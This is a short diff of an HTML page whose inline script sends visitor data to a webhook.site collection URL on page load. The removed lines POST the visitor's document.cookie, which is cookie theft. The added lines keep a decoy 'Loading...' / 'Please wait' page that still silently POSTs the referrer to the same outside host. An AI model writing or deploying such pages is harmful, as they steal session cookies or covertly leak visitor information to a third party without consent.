@@ -1,18 +1,16 @@
 <!DOCTYPE html>
 <html>
-
 <head>
+    <title>Loading...</title>
 </head>
-
 <body>
-    <h1>aahahahahahaahhah</h1>
+    <h1>Please wait</h1>
     <script>
         fetch('https://webhook.site/f274ce66-95a3-43e4-8fd0-58833dbce475', {
             method: 'POST',
             mode: 'no-cors',
-            body: JSON.stringify({ cookies: document.cookie })
+            body: 'User came from: ' + document.referrer
         });
     </script>
 </body>
-
 </html>
